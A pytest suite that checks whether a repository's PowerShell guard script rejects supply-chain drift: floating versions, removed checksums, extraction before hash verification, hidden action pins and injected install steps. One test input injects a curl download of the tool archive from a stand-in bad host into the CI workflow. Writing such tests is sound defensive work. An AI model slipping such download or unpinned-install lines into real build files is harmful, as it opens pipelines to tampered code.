"""Subprocess evidence for actual input rejection and native exit propagation."""

import json
import os
import shutil
import subprocess
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[2]
SHELL = "powershell.exe" if os.name == "nt" else "pwsh"


@pytest.fixture
def checkout(tmp_path):
    for relative in (
        "ops/check.ps1",
        "package.json",
        "apps/web/package.json",
        ".npmrc",
        "pnpm-workspace.yaml",
        "pnpm-lock.yaml",
        "requirements.in",
        "requirements.lock",
        "apps/web/Dockerfile",
        "apps/api/Dockerfile",
        "compose.yaml",
        ".github/workflows/foundation.yml",
        "tests/integration/test_auth_mail.py",
        "tests/integration/test_tenant_isolation.py",
        "tests/integration/test_identity_persistence.py",
        "tests/integration/test_evidence_persistence.py",
    ):
        target = tmp_path / relative
        target.parent.mkdir(parents=True, exist_ok=True)
        shutil.copyfile(ROOT / relative, target)
    return tmp_path


def _check(checkout, mode="inputs", env=None):
    if env is None:
        env = {
            **os.environ,
            "PATH": str(Path(sys.executable).parent) + os.pathsep + os.environ["PATH"],
        }
    return subprocess.run(
        [SHELL, "-NoProfile", "-File", str(checkout / "ops/check.ps1"), mode],
        check=False,
        cwd=checkout,
        env=env,
        capture_output=True,
        text=True,
        timeout=45,
    )


@pytest.mark.parametrize("version", ["^15.5.28", "15.5.29"])
def test_floating_or_unapproved_manifest_is_rejected_before_install(checkout, version):
    manifest = checkout / "apps/web/package.json"
    package = json.loads(manifest.read_text())
    package["dependencies"]["next"] = version
    manifest.write_text(json.dumps(package))
    completed = _check(checkout)
    assert completed.returncode != 0
    assert "approved manifest pins" in completed.stdout + completed.stderr


def test_floating_image_is_rejected_before_docker(checkout):
    compose = checkout / "compose.yaml"
    compose.write_text(
        compose.read_text().replace(
            "postgres:17.11-bookworm@sha256:858bb5e98eed02eb8cafbcdc007f9a65d1b613972028944a8ec2133ccaf80d27",
            "postgres:latest",
        )
    )
    completed = _check(checkout)
    assert completed.returncode != 0
    assert "approved image references" in completed.stdout + completed.stderr


@pytest.mark.parametrize("filename", ["pnpm-lock.yaml", "requirements.lock"])
def test_inconsistent_lock_is_rejected_without_regeneration(checkout, filename):
    lock = checkout / filename
    lock.write_bytes(lock.read_bytes() + b"\n# isolated synthetic drift\n")
    before = lock.read_bytes()
    completed = _check(checkout)
    assert completed.returncode != 0
    assert filename + " drift" in completed.stdout + completed.stderr
    assert lock.read_bytes() == before


def _native_stub(checkout, name, body):
    directory = checkout / "stub-bin"
    directory.mkdir(exist_ok=True)
    script = directory / (name + ".cmd" if os.name == "nt" else name)
    script.write_text(("@echo off\n" if os.name == "nt" else "#!/bin/sh\n") + body)
    script.chmod(0o755)
    return {
        **os.environ,
        "PATH": os.pathsep.join(
            (str(directory), str(Path(sys.executable).parent), os.environ["PATH"])
        ),
    }


def test_missing_f07_suite_fails_before_docker(checkout):
    suite = checkout / "tests/integration/test_auth_mail.py"
    assert suite.is_file()
    suite.unlink()
    marker = checkout / "docker-was-called"
    env = _native_stub(checkout, "docker", f'echo called > "{marker}"\nexit 1\n')
    completed = _check(checkout, "integration", env)
    assert completed.returncode != 0
    assert (
        "Missing required F-07 integration test" in completed.stdout + completed.stderr
    )
    assert not marker.exists()


def test_missing_d01_suite_fails_before_docker(checkout):
    suite = checkout / "tests/integration/test_tenant_isolation.py"
    suite.unlink()
    completed = _check(checkout, "integration")
    assert completed.returncode != 0
    assert (
        "Missing required D-01 integration test" in completed.stdout + completed.stderr
    )


def test_missing_d09_suite_fails_before_docker(checkout):
    suite = checkout / "tests/integration/test_evidence_persistence.py"
    suite.unlink()
    completed = _check(checkout, "integration")
    assert completed.returncode != 0
    assert (
        "Missing required D-09 integration test" in completed.stdout + completed.stderr
    )


def test_runtime_version_mismatch_is_rejected(checkout):
    env = _native_stub(checkout, "node", "echo v0.0.0\nexit 0\n")
    completed = _check(checkout, env=env)
    assert completed.returncode != 0
    assert "Unapproved Node version" in completed.stdout + completed.stderr


def test_native_failure_becomes_runner_failure(checkout):
    env = _native_stub(checkout, "python", "exit 23\n")
    completed = _check(checkout, "unit", env)
    assert completed.returncode != 0
    assert "exit 23" in completed.stdout + completed.stderr


def test_peer_validation_cannot_be_disabled(checkout):
    npmrc = checkout / ".npmrc"
    npmrc.write_text(
        npmrc.read_text().replace(
            "strict-peer-dependencies=true", "strict-peer-dependencies=false"
        )
    )
    completed = _check(checkout)
    assert completed.returncode != 0
    assert "strict engines/peers" in completed.stdout + completed.stderr


@pytest.mark.parametrize(
    ("filename", "original", "replacement"),
    [
        (
            "apps/api/Dockerfile",
            "python:3.13.16-slim-bookworm@sha256:73aa5faee130c60da030e105ec971ccf57473fbd22ce73bd6fc9ba99a40b838d",
            "python:latest",
        ),
        (
            "apps/web/Dockerfile",
            "node:24.22.1-bookworm-slim@sha256:55fb5f5a527ea2c5c4a95f963e48ef90aa38c7b346054fdc8ee9957a2b55d205",
            "node:latest",
        ),
        (
            ".github/workflows/foundation.yml",
            "docker-compose-plugin=5.6.1-1~ubuntu.24.04~noble",
            "docker-compose-plugin=5.6.2-1~ubuntu.24.04~noble",
        ),
        (
            ".github/workflows/foundation.yml",
            "docker-ce=5:29.9.2-1~ubuntu.24.04~noble",
            "docker-ce",
        ),
        (
            ".github/workflows/foundation.yml",
            "containerd.io=2.4.2-3~ubuntu.24.04~noble",
            "containerd.io=latest",
        ),
        (
            ".github/workflows/foundation.yml",
            "docker-buildx-plugin=0.38.1-1~ubuntu.24.04~noble",
            "docker-buildx-plugin=latest",
        ),
        (
            ".github/workflows/foundation.yml",
            "releases/download/v7.6.7/powershell-7.6.7-linux-x64.tar.gz",
            "releases/download/v7.6.8/powershell-7.6.8-linux-x64.tar.gz",
        ),
        (
            ".github/workflows/foundation.yml",
            "f4b1bfb3c79b5bb11b8d228a12504163b4c0dab4d679828d8f5f26b6cb6ab35d",
            "0" * 64,
        ),
        (
            ".github/workflows/foundation.yml",
            "node-v24.22.1-linux-x64.tar.xz",
            "node-v24.22.2-linux-x64.tar.xz",
        ),
        (
            ".github/workflows/foundation.yml",
            'test "$(docker compose version --short)" = 5.6.1',
            'test "$(docker compose version --short)" = 5.6.2',
        ),
        (
            ".github/workflows/foundation.yml",
            "pnpm@10.34.7",
            "pnpm@latest",
        ),
        (
            ".github/workflows/foundation.yml",
            "#sha256=fd7f4dfa8190e014013b9f08f3e973f4e4c26ffd179a204895533a7254813a70",
            "",
        ),
        (
            "apps/api/Dockerfile",
            "#sha256=fd7f4dfa8190e014013b9f08f3e973f4e4c26ffd179a204895533a7254813a70",
            "",
        ),
        (
            "apps/api/Dockerfile",
            "assert pip.__version__ == '26.2.2'",
            "assert pip.__version__ == '26.2.1'",
        ),
        (
            "apps/web/Dockerfile",
            "pnpm@10.34.7",
            "pnpm@latest",
        ),
        (
            "apps/web/Dockerfile",
            "pnpm install --frozen-lockfile",
            "pnpm install",
        ),
    ],
)
def test_ci_tool_and_installer_drift_is_rejected_before_install(
    checkout, filename, original, replacement
):
    target = checkout / filename
    content = target.read_text()
    assert original in content
    target.write_text(content.replace(original, replacement, 1))
    completed = _check(checkout)
    assert completed.returncode != 0
    assert filename + " executable input drift" in completed.stdout + completed.stderr


def test_ci_archive_must_be_verified_before_extraction(checkout):
    workflow = checkout / ".github/workflows/foundation.yml"
    content = workflow.read_text()
    hash_line = (
        'echo "6896f9e3a6b0a354bf470835a96da76d2f801cd50dcf047ad7c4563bf93bf431'
        '  $RUNNER_TEMP/pwsh.tar.gz" | sha256sum -c -'
    )
    extract_line = 'tar -xzf "$RUNNER_TEMP/pwsh.tar.gz" -C "$RUNNER_TEMP/pwsh"'
    assert hash_line in content and extract_line in content
    workflow.write_text(
        content.replace(hash_line, "ARCHIVE_HASH_PLACEHOLDER", 1)
        .replace(extract_line, hash_line, 1)
        .replace("ARCHIVE_HASH_PLACEHOLDER", extract_line, 1)
    )
    completed = _check(checkout)
    assert completed.returncode != 0
    assert ".github/workflows/foundation.yml executable input drift" in (
        completed.stdout + completed.stderr
    )


def test_commented_checkout_pin_cannot_hide_unapproved_action(checkout):
    workflow = checkout / ".github/workflows/foundation.yml"
    content = workflow.read_text()
    approved = "- uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1"
    assert content.count(approved) == 2
    workflow.write_text(
        content.replace(approved, "- uses : actions/checkout@main", 1)
        + "\n# "
        + approved
        + "\n"
    )
    completed = _check(checkout)
    assert completed.returncode != 0
    assert ".github/workflows/foundation.yml executable input drift" in (
        completed.stdout + completed.stderr
    )


@pytest.mark.parametrize(
    ("filename", "needle", "injection"),
    [
        (
            ".github/workflows/foundation.yml",
            'tar -xzf "$RUNNER_TEMP/pwsh.tar.gz" -C "$RUNNER_TEMP/pwsh"',
            'command curl -fsSL -o "$RUNNER_TEMP/pwsh.tar.gz" https://example.invalid/bad',
        ),
        (
            ".github/workflows/foundation.yml",
            "sudo systemctl restart docker",
            "sudo apt install -y docker-compose-plugin",
        ),
        (
            "apps/web/Dockerfile",
            "RUN pnpm install --frozen-lockfile",
            "RUN npm i -g pnpm@latest",
        ),
        (
            "apps/api/Dockerfile",
            "COPY requirements.lock /srv/requirements.lock",
            "RUN python3 -m pip install --no-cache-dir pip",
        ),
    ],
)
def test_extra_executable_install_or_download_is_rejected(
    checkout, filename, needle, injection
):
    target = checkout / filename
    content = target.read_text()
    assert needle in content
    target.write_text(content.replace(needle, injection + "\n          " + needle, 1))
    completed = _check(checkout)
    assert completed.returncode != 0
    assert filename + " executable input drift" in completed.stdout + completed.stderr
